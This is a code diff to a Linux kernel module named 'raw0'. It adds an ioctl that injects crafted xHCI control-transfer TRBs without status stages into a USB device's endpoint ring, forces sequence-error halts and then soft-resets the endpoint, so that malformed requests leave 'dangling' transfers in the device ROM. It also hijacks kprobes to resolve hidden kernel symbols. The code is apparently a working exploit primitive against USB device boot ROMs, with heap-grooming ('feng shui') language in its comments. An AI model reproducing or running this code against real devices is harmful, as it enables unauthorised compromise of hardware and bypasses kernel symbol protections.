@@ -46,6 +46,7 @@
 #define RAW0_IOC_INFO _IOR(RAW0_IOCBASE, 2, struct raw0_info)
 #define RAW0_IOC_STATE _IOR(RAW0_IOCBASE, 3, struct raw0_state)
 #define RAW0_IOC_LEAK _IOW(RAW0_IOCBASE, 4, struct raw0_leak)
+#define RAW0_IOC_CYC  _IOW(RAW0_IOCBASE, 5, struct raw0_cyc)
 
 #define RAW0_MAX_DATA 0x1000
 
@@ -97,6 +98,36 @@ struct raw0_leak {
 	__u64 user_data;    /* data source pointer */
 } __attribute__((packed));
 
+/*
+ * CYC: the halt-recovery leak cycle (the ledger's open loophole).
+ * Per xHCI spec 4.12.2 a Setup Stage TRB arriving while a control
+ * transfer is incomplete = Sequence Error + endpoint HALTED. The
+ * kernel does not recover halts caused by module-pushed TDs (td_list
+ * mismatch), but the chip honors the spec: Reset Endpoint with the
+ * TSP (soft reset) bit transitions Halted -> Running without
+ * touching ring pointers. So one wire-leak per cycle:
+ *   push dangling TD (setup+data, no status) [+prior dangling
+ *   pending -> xHC halts at the new SETUP TRB] -> settle -> poll
+ *   EP0 ctx for Halted -> queue Reset Endpoint (STOP-TSP via
+ *   xhci_queue_reset_ep, kallsyms-resolved; commands ride the
+ *   kernel's own cmd_list lifecycle) -> poll Running.
+ * The halted-then-resumed SETUP then executes on the wire: the ROM
+ * parses a fresh request, serves its data phase, and never receives
+ * the status phase of the previous one - the dangling leak.
+ * Return: 0 = full cycle, 1 = first cycle (no prior dangling, the
+ * TD executed immediately), negative = errno.
+ */
+struct raw0_cyc {
+	__u8 setup[8];
+	__u32 data_len;     /* data phase length on the wire */
+	__u8 has_data;
+	__u8 dir_in;
+	__u16 pad0;
+	__u32 settle_us;    /* post-push settle before halt polling */
+	__u32 pad1;
+	__u64 user_data;    /* data source (Overshoot-capable) */
+} __attribute__((packed));
+
 /* ------------------------------------------------------------------ */
 /* hook state                                                          */
 
@@ -118,6 +149,7 @@ static int staging_mapped;     /* persistent once the xhci is known:
                                 * (per-push unmap caused AMD-Vi IO page
                                 * faults that wedged EP0). */
 static u32 g_trbs_pushed;
+static u32 g_cyc_outstanding;
 
 static void notrace raw0_hook(unsigned long ip, unsigned long parent_ip,
                               struct ftrace_ops *op, struct ftrace_regs *fregs)
@@ -407,7 +439,212 @@ out:
 }
 
 /* ------------------------------------------------------------------ */
-/* LEAK: URB submit + hrtimer-armed cancel (the wire-true feng shui)   */
+/* CYC: halt-recovery leak cycle (see struct raw0_cyc)                */
+
+static struct xhci_command *(*p_alloc_cmd)(struct xhci_hcd *, bool, gfp_t);
+static void (*p_free_cmd)(struct xhci_hcd *, struct xhci_command *);
+static int (*p_queue_reset_ep)(struct xhci_hcd *, struct xhci_command *,
+                               int, unsigned int, enum xhci_ep_reset_type);
+static void (*p_ring_cmd_db)(struct xhci_hcd *);
+
+static void *(*kallsyms_one)(const char *name);
+
+static void *resolve_sym(const char *name)
+{
+	/* register_kprobe resolves any symbol (static or exported) -
+	 * the same trick the hook registration uses. */
+	struct kprobe kp = { .symbol_name = NULL };
+	void *addr;
+
+	if (kallsyms_one) {
+		addr = kallsyms_one(name);
+		if (addr)
+			return addr;
+	}
+	kp.symbol_name = name;
+	if (register_kprobe(&kp) < 0)
+		return NULL;
+	addr = kp.addr;
+	unregister_kprobe(&kp);
+	return addr && addr != (void *)-1 ? addr : NULL;
+}
+
+/*
+ * EP0 context state from the output device context. This AMD chip
+ * uses 64-byte contexts: EP0 ctx DW0 sits at bytes+64. Probe both
+ * offsets and keep the one with a sane low nibble.
+ */
+static u32 raw0_ep0_state(struct xhci_hcd *xhci, int slot)
+{
+	struct xhci_virt_device *v = xhci->devs[slot];
+	u32 s;
+
+	if (!v || !v->out_ctx)
+		return 0xFF;
+	s = le32_to_cpu(*(__le32 *)(v->out_ctx->bytes + 64));
+	if ((s & 0x7) <= 3)
+		return s & 0x7;
+	s = le32_to_cpu(*(__le32 *)(v->out_ctx->bytes + 32));
+	if ((s & 0x7) <= 3)
+		return s & 0x7;
+	return 0xFF;
+}
+
+static int raw0_cyc(const struct raw0_cyc *c)
+{
+	struct xhci_hcd *xhci = g_xhci;
+	struct xhci_virt_device *vdev;
+	struct xhci_ring *ring;
+	unsigned long flags;
+	u64 setup_param;
+	u32 trbs, off, remain, i;
+	int rc = 0;
+	ktime_t t0;
+	struct xhci_command *cmd;
+
+	if (!xhci || g_slot < 0)
+		return -ENODEV;
+	if (!p_queue_reset_ep || !p_alloc_cmd || !p_free_cmd ||
+	    !p_ring_cmd_db)
+		return -EOPNOTSUPP;
+	vdev = xhci->devs[g_slot];
+	if (!vdev || !vdev->eps[0].ring)
+		return -ENODEV;
+	ring = vdev->eps[0].ring;
+	if (c->data_len > RAW0_MAX_DATA)
+		return -EMSGSIZE;
+
+	mutex_lock(&raw0_mtx);
+
+	/* copy data into staging (persistent DMA mapping) */
+	if (c->has_data && c->data_len && c->user_data) {
+		if (copy_from_user(staging,
+			(const void __user *)(unsigned long)c->user_data,
+			c->data_len)) {
+			rc = -EFAULT;
+			goto out;
+		}
+		if (!staging_mapped) {
+			struct device *dm = xhci_to_hcd(xhci)->self.sysdev;
+			staging_dma = dma_map_single(dm, staging,
+				RAW0_MAX_DATA, DMA_BIDIRECTIONAL);
+			if (dma_mapping_error(dm, staging_dma)) {
+				rc = -EIO;
+				goto out;
+			}
+			staging_mapped = 1;
+		}
+		wmb();
+	}
+
+	trbs = 1 + (c->has_data ? (c->data_len + 0x3f) / 0x40 : 0);
+
+	spin_lock_irqsave(&xhci->lock, flags);
+	/* simple headroom check against our own outstanding count; the
+	 * xHC consumes the previous cycle's TRBs so this stays tiny */
+	if (g_cyc_outstanding + trbs + 32 > TRBS_PER_SEGMENT) {
+		spin_unlock_irqrestore(&xhci->lock, flags);
+		rc = -ENOSPC;
+		goto out;
+	}
+	setup_param = le64_to_cpu(*(__le64 *)c->setup);
+	{
+		u32 setup_ctl = TRB_TYPE(TRB_SETUP) | TRB_IDT | TRB_CHAIN;
+		if (c->has_data)
+			setup_ctl |= TRB_TX_TYPE(c->dir_in ? TRB_DATA_IN :
+			                          TRB_DATA_OUT);
+		rc = queue_trb_rep(ring, setup_param, 8, setup_ctl, true);
+		if (rc)
+			goto unlock;
+	}
+	if (c->has_data && c->data_len) {
+		remain = (c->data_len + 0x3f) / 0x40;
+		off = 0;
+		for (i = 0; i < remain; i++) {
+			u32 chunk = min_t(u32, 0x40, c->data_len - off);
+			u32 data_ctl = TRB_TYPE(TRB_DATA);
+			if (c->dir_in)
+				data_ctl |= TRB_DIR_IN;
+			if (i + 1 < remain)
+				data_ctl |= TRB_CHAIN;
+			rc = queue_trb_rep(ring, staging_dma + off, chunk,
+			                  data_ctl, (i + 1 < remain));
+			if (rc)
+				goto unlock;
+			off += chunk;
+		}
+	}
+	writel(DB_VALUE(0, 0), &xhci->dba->doorbell[g_slot]);
+	g_cyc_outstanding += trbs;
+unlock:
+	spin_unlock_irqrestore(&xhci->lock, flags);
+	if (rc)
+		goto out;
+
+	/* settle: let the xHC fetch and hit the sequence-error halt */
+	if (c->settle_us)
+		udelay(c->settle_us);
+
+	/* poll for Halted (state 2) - but the FIRST cycle (no prior
+	 * dangling) executes immediately and never halts */
+	t0 = ktime_get();
+	while (ktime_us_delta(ktime_get(), t0) < 3000) {
+		if (raw0_ep0_state(xhci, g_slot) == 2)
+			break;
+		udelay(20);
+	}
+	if (raw0_ep0_state(xhci, g_slot) != 2) {
+		/* no halt: either first-ever cycle (fine) or the TD ran
+		 * - report 1 so the tool knows no recovery was needed */
+		rc = 1;
+		goto out;
+	}
+
+	/* Halted: recover with Reset Endpoint, soft reset (TSP) */
+	cmd = p_alloc_cmd(xhci, true, GFP_KERNEL);
+	if (!cmd) {
+		rc = -ENOMEM;
+		goto out;
+	}
+	spin_lock_irqsave(&xhci->lock, flags);
+	rc = p_queue_reset_ep(xhci, cmd, g_slot, 0, EP_SOFT_RESET);
+	if (rc == 0)
+		p_ring_cmd_db(xhci);
+	spin_unlock_irqrestore(&xhci->lock, flags);
+	if (rc) {
+		p_free_cmd(xhci, cmd);
+		goto out;
+	}
+	if (!wait_for_completion_timeout(cmd->completion,
+	                                 msecs_to_jiffies(100))) {
+		p_free_cmd(xhci, cmd);
+		rc = -ETIMEDOUT;
+		goto out;
+	}
+	rc = cmd->status;
+	p_free_cmd(xhci, cmd);
+	if (rc != 0) {
+		rc = -EIO;
+		goto out;
+	}
+
+	/* poll for Running */
+	t0 = ktime_get();
+	while (ktime_us_delta(ktime_get(), t0) < 3000) {
+		if (raw0_ep0_state(xhci, g_slot) == 1)
+			break;
+		udelay(20);
+	}
+	rc = 0;
+out:
+	/* every TRB we ever pushed has been consumed by the xHC once the
+	 * cycle completes (halted SETUP executed after recovery, data
+	 * phase served, previous dangles left behind on the wire) */
+	if (rc >= 0)
+		g_cyc_outstanding = 0;
+	mutex_unlock(&raw0_mtx);
+	return rc;
+}
 
 static struct usb_device *leak_udev;   /* held reference */
 static struct urb *leak_urb;
@@ -535,6 +772,7 @@ static long raw0_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
 {
 	struct raw0_txn t;
 	struct raw0_leak lk;
+	struct raw0_cyc cyc;
 	struct raw0_state st;
 
 	switch (cmd) {
@@ -546,6 +784,10 @@ static long raw0_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
 		if (copy_from_user(&lk, (void __user *)arg, sizeof(lk)))
 			return -EFAULT;
 		return raw0_leak(&lk);
+	case RAW0_IOC_CYC:
+		if (copy_from_user(&cyc, (void __user *)arg, sizeof(cyc)))
+			return -EFAULT;
+		return raw0_cyc(&cyc);
 	case RAW0_IOC_STATE:
 		memset(&st, 0, sizeof(st));
 		st.xhci_addr = (u64)(uintptr_t)g_xhci;
@@ -618,6 +860,22 @@ static int __init raw0_init(void)
 	}
 	pr_info("raw0: hooking xhci_setup_device at %px "
 	        "(BSR=1 + xhci/slot capture)\n", (void *)target_addr);
+
+	kallsyms_one = (void *(*)(const char *))
+		resolve_sym("kallsyms_lookup_name");
+	p_alloc_cmd = resolve_sym("xhci_alloc_command");
+	p_free_cmd = resolve_sym("xhci_free_command");
+	p_queue_reset_ep = resolve_sym("xhci_queue_reset_ep");
+	p_ring_cmd_db = resolve_sym("xhci_ring_cmd_db");
+	if (!p_alloc_cmd || !p_free_cmd || !p_queue_reset_ep ||
+	    !p_ring_cmd_db) {
+		pr_err("raw0: command symbold resolution failed\n");
+		ret = -ENOENT;
+		goto err_hook;
+	}
+	pr_info("raw0: cycle engine ready (alloc_cmd=%px queue_reset_ep=%px "
+	        "ring_cmd_db=%px)\n", p_alloc_cmd, p_queue_reset_ep,
+	        p_ring_cmd_db);
 
 	ret = alloc_chrdev_region(&raw0_devt, 0, 1, "raw0");
 	if (ret)
